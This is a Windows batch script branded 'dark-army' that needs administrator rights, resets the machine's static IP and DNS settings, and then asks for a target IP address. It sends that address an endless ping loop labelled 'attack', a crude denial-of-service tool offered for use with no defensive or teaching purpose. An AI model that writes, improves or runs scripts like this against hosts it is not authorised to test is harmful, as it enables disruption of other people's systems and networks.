@echo off 
title dark-army

net session >nul 2>&1
if %errorLevel% == 0 (
    goto hhhhhh
) else (
        echo run admin .
        echo.
		pause 
		exit
)

:hhhhhh
cls
chcp 65001 >nul
echo.
echo.
echo            ██╗██████╗ 
echo            ██║██╔══██╗
echo            ██║██████╔╝
echo            ██║██╔═══╝ 
echo            ██║██║     
echo            ╚═╝╚═╝
echo.    
set /p hi="the desired static IP address : "
echo.
set /p hello="this with the appropriate subnet mask : "
echo.
set /p bebe="the correct gateway : "
echo.
echo.
cls
color a
echo Changing IP Address...
echo.
netsh interface ip set address name="Local Area Connection" static %hi% %hello% %bebe%
netsh interface ip set dns name="Local Area Connection" static 8.8.8.8
timeout 2
cd data
goto banner
cls 
:banner 
color 0
cls 
echo.
echo.
echo                ██████╗        █████╗ ██████╗ ███╗   ███╗██╗   ██╗
echo                ██╔══██╗      ██╔══██╗██╔══██╗████╗ ████║╚██╗ ██╔╝
echo                ██║  ██║█████╗███████║██████╔╝██╔████╔██║ ╚████╔╝ 
echo                ██║  ██║╚════╝██╔══██║██╔══██╗██║╚██╔╝██║  ╚██╔╝  
echo                ██████╔╝      ██║  ██║██║  ██║██║ ╚═╝ ██║   ██║   
echo                ╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝ 
echo                ███████████████████████████████████████████████
echo                ██                                           ██
echo                ██-------------------Rm-rf-------------------██
echo                ██                                           ██
echo                ███████████████████████████████████████████████
echo.              
echo.
set /p kali="IP : "
echo.
echo set ip %kali%
echo.
timeout 2 >nul 
cls
color a 
:attack
echo attack %kali% = %time% = %date%  
ping -n 1 %kali% >nul
goto attack 
